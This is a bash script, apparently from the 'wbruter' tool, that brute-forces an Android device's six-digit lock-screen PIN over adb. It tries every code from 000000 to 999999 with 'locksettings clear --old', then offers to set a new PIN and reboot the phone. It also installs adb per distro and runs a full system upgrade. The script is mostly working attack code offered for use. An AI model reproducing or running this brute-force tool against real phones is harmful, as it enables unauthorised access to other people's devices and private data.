#!/bin/bash
####
#### Copyright (C) 2019  wuseman <wuseman@nr1.nu> - All Rights Reserved
#### Created: Created: 12-01-2019 
####


androiddebug() {
case $(adb devices | awk '{print $2}' | sed 1d | sed '$d') in  
    "unauthorized") echo "You must enable usb-debugging in developer settings." ;;
esac
}

adbexist() {
adb="$(which adb 2> /dev/null)"
distro="$(cat /etc/os-release | head -n 1 | cut -d'=' -f2 | sed 's/"//g')"

if [ -z "$adb" ]; then
 echo -e "\nThis tool require adb to be installed..\n"
  read -p "Install adb (Y/n) " adbinstall
fi

case $adbinstall in
     "Y")
        echo -e "\nPlease wait..\n"
      sleep 1
case $distro in
     "Gentoo")
        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
        emerge --ask android-tools ;;
     "Sabayon")
        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
        emerge --ask android-tools ;;
     "Ubuntu")
        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
        apt update -y; apt upgrade -y; apt-get install adb ;;
     "Debian")
        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
        apt update -y; apt upgrade -y; apt-get install adb ;;
     "Raspbian")
        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
        apt update -y; apt upgrade -y; apt-get install adb ;;
     "Mint")
        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
        apt update -y; apt upgrade -y; apt-get install adb ;;
     "no") echo "Aborted." ;
           exit 0 ;;
esac
       echo -e "This tool is not supported for $distro, please go compile it from source instead...\n"
esac
}


connectedornot() {
isphoneconnected="$(adb devices | sed '1d' | sed '/^$/d')"
 if [ ! $isphoneconnected 2> /dev/null ]; then
      echo "* Your device is not connected properly.."
      exit
fi
}

androidpinattack6() {
androiddebug; adbexist; connectedornot

cr=`echo $'\n.'`
cr=${cr%.}
    printf "%52s\n" | tr ' ' '-'
    echo -e "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime.."
    printf "%52s\n" | tr ' ' '-'
for i in {000000..999999}; do
if [[ -z $(adb shell locksettings clear --old $i | grep "Lock credential cleared") ]]; then
    printf "Wrong PIN: \e[1;31m$i\e[0m\n"
else
    printf "\nPIN Code Has Been Found: \e[1;32m$i\e[0m\n\n"
    printf "Do you want to set a new PIN "; read -p "(y/N): " newpin
case $newpin in
   y)
    read -p "Pin: " newpin2
    adb shell locksettings set-pin $newpin2
    printf "\nIt is required to restart your device after\n"
    printf "PIN code has been set after old pin was erased..\n\n"
    ;;
   N)
    printf "\nIt is required to restart your device after\n"
    printf "PIN code has been erased from your device..\n\n";
    ;;
esac
    read -p "restart device (y/N): " rebootornot
case $rebootornot in
    y) adb shell reboot; printf "\nRebooting device, use pin '$newpin2' for unlock device..\n\n" ;;
    N) printf "\nPin was cracked by wbruter v1.5\n\n";exit 0 ;;
esac
    exit
fi
done

}
